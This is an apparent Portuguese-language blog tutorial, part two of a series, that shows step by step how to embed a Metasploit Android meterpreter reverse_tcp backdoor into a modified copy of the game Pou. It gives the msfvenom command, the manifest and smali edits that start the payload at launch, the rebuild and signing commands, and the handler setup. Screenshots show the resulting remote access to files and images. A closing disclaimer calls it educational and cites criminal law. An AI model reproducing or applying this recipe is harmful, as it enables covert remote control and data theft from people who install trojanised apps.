---
title: Já usou algum aplicativo modificado? (parte 2)
excerpt: Segunda parte do artigo, como criar um aplicativo modificado para fins de estudo.
date: 2020-02-25 23:00:00
tags: 1,2,3
cover: https://cdn-images-1.medium.com/max/800/1*nQw9NwHbf-3lW2fB3Y5zyg.png
cover_creditos:
default_cover:
---

Hello friends.

Você pode esta sendo espionado 😂.

Nesta segunda parte irei colocar um backdoor no jogo que modificamos no último [post](https://medium.com/@andersongomes001/j%C3%A1-usou-algum-aplicativo-modificado-7771a390288a).

Primeiro vamos criar um payload para android com o “msfvenom”, vai abrindo aquela máquina virtual com kali que você não usa já faz um tempo.

O comando é o seguinte.

> msfvenom -p android/meterpreter/reverse\_tcp LHOST=192.168.1.6 LPORT=9090 R > payload.apk

Apenas troque o “192.168.1.6” pelo ip do seu servidor e “9090” pela porta que será aberta nele.

Depois de gerar o apk precisamos descompilar e pegar o que precisamos e colocar no jogo.

> _java -jar apktool\_2.4.1.jar d_ payload.apk

Depois de descompilar devemos ir no arquivo “AndroidManifest.xml” e copiar as permissões “uses-permission” e as características “uses-feature” para o “AndroidManifest.xml” do jogo lembrando de eliminar as linhas duplicadas.

No final vai ficar parecido com a imagem abaixo.

<figure class="image">
      <img src="https://cdn-images-1.medium.com/max/800/1*nQw9NwHbf-3lW2fB3Y5zyg.png" alt="">
      <figcaption></figcaption>
    </figure>

Precisamos copiar mais alguma coisas para o payload funcionar no jogo.

<figure class="image">
      <img src="https://cdn-images-1.medium.com/max/800/1*HgkUz3oSxlXitccyzsyxHQ.png" alt="">
      <figcaption></figcaption>
    </figure>

Copie o “intent-filter” para a activity que tiver “android.intent.action.MAIN” com certeza ela sera a classe principal, e o “receiver” e “service” podem colocar logo abaixo dela.

Agora mude **“.MainBroadcastReceiver”** para **“com.metasploit.stage.MainBroadcastReceiver”** e **“.MainService”** para **“com.metasploit.stage.MainService”.**

No final de tudo isso o arquivo “AndroidManifest.xml” do jogo ficara parecido com este.

<figure class="image">
      <img src="https://cdn-images-1.medium.com/max/800/1*LGKdV6wvrDLI1atuMZbYlw.png" alt="">
      <figcaption></figcaption>
    </figure>

Dentro do payload vamos até a classe “MainActivity.smali” e copie a seguinte linha.

> invoke-static {p0}, Lcom/metasploit/stage/MainService;->startService(Landroid/content/Context;)V

Lembra lá no primeiro post que precisávamos saber qual era a classe que iniciava o jogo? Ela vai servir agora.

Dentro da classe “App.smali” no jogo, procure pelo método “onCreate” e logo apos a chamada da superclasse devemos colar a linha copiada do payload, ficara parecida com a imagem abaixo.

<figure class="image">
      <img src="https://cdn-images-1.medium.com/max/800/1*3WImqjXD-0p0MALJK2qMUg.png" alt="">
      <figcaption></figcaption>
    </figure>

O próximo passo é copiar as classes necessitarias para o payload funcionar, vá ate a pasta “payload\\smali\\com” copie a pasta “metasploit” para “pou\\smali\\com” feito isso é só compilar e assinar o apk.

> java -jar apktool\_2.4.1.jar b pou -o pou\_mod.apk

> java -jar uber-apk-signer-1.1.0.jar -a pou\_mod.apk

Antes de instalar o apk vamos iniciar o handler no kali com o comando abaixo.

> _msfconsole  
> use exploit/multi/handler  
> set payload android/meterpreter/reverse\_tcp  
> set LHOST 192.168.1.6  
> set LPORT 9090  
> exploit_

<figure class="image">
      <img src="https://cdn-images-1.medium.com/max/800/1*fU48oND3KugaYtEC0a7beQ.png" alt="">
      <figcaption></figcaption>
    </figure>

Agora é só instalar o app e quando for iniciado ganhamos acesso ao dispositivo.

<figure class="image">
      <img src="https://cdn-images-1.medium.com/max/800/1*fXM5lJhnRW8Qdvtlfqjbyw.png" alt="">
      <figcaption></figcaption>
    </figure>

Depois de ganhar o acesso você pode baixar imagens, arquivos, criar novos arquivos etc.

<figure class="image">
      <img src="https://cdn-images-1.medium.com/max/800/1*F41qJWShqkIPZiV-nMXRWw.png" alt="">
      <figcaption></figcaption>
    </figure>

Digitando **help** o “meterpreter” mostra uma lista de comando possíveis para serem executados no android.

<figure class="image">
      <img src="https://cdn-images-1.medium.com/max/800/1*AGxzXgR1M0WCpwtttdoEdQ.png" alt="">
      <figcaption></figcaption>
    </figure>

E ai ainda vai instalar algum aplicativo modificado que você encontrar na internet?

O conteúdo que disponibilizei foi para fins educativos, e saiba que invadir ou instalar programa para acessar remotamente um dispositivo, bem como clonar, para obter informações do outro, poderá incorrer no crime previsto no art. 154-A do Código Penal.
